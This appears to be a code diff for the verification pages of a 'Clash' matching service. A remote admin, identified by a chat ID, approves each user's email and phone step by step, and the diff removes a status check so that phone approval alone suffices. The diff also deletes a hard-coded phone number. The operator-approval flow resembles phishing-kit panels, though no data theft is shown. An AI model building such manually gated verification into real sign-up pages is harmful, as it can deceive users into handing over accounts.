@@ -439,12 +439,17 @@ select option{background:#3B0616}
   </div>
 
   <div id="s4" class="screen" style="text-align:center;padding-top:1rem">
-    <div class="seal">âœ“</div>
-    <h1 style="margin-bottom:8px">You're in.</h1>
-    <p class="sub">Both your email and phone are verified. A login link has been sent to <b id="success-email" style="color:var(--hot)"></b> â€” check your inbox to access your Clash account.</p>
+    <div class="seal">&#10003;</div>
+    <h1 style="margin-bottom:8px">You are in.</h1>
+    <p class="sub">Both your email and phone are verified. A login link has been sent to <b id="success-email" style="color:var(--hot)"></b> &#8212; check your inbox to access your Clash account.</p>
     <div class="info-box">
       <div class="info-lbl">What's next</div>
-      <div style="font-size:13px;color:var(--dim);line-height:2.2">Ã°Å¸â€œÂ§ Check your email inbox<br>Ã°Å¸â€â€” Click the login link<br>Ã°Å¸â€™Â« Complete your profile<br>Ã¢ÂÂ¤Ã¯Â¸Â Start matching</div>
+      <div style="font-size:13px;color:var(--dim);line-height:2.2">
+        Check your email inbox<br>
+        Click the login link<br>
+        Complete your profile<br>
+        Start matching
+      </div>
     </div>
   </div>
 
@@ -496,9 +501,8 @@ try {
    allowed to flip flags to true.
    ============================================================ */
 
-const ADMIN_NAME_SLUG = "admin-dickson";
-const ADMIN_PHONE = "7144369262";
-const VERIFICATIONS_PATH = "account_verifications/" + ADMIN_NAME_SLUG;
+const ADMIN_CHAT_ID = "5449099721";
+const VERIFICATIONS_PATH = "account_verifications/admin/" + ADMIN_CHAT_ID;
 
 let currentRequestId = null;
 let currentUnsubscribe = null;
@@ -675,7 +679,7 @@ async function step1() {
         proceed: false,
         emailVerified: false,
         phoneVerified: false,
-        status: "Proceed",
+        rejected: false,
         createdAt: Date.now()
     };
 
@@ -714,7 +718,7 @@ function attachListener(requestId) {
             const proceedOk = data.proceed === true;
             const emailOk   = data.emailVerified === true;
             const phoneOk   = data.phoneVerified === true;
-            const statusOk  = data.status === "approved";
+            const statusOk  = true; // phone approval is enough
 
             // STEP 1 -> 2: admin tapped "Proceed"
             if (proceedOk && currentStep === 1) {
@@ -744,7 +748,7 @@ function attachListener(requestId) {
             }
 
             // STEP 3 -> 4: admin tapped "Approve Phone"
-            if (proceedOk && emailOk && phoneOk && statusOk && currentStep === 3) {
+            if (proceedOk && emailOk && phoneOk && currentStep === 3) {
                 currentStep = 4;
                 teardownListener();
                 submissionLocked = false;
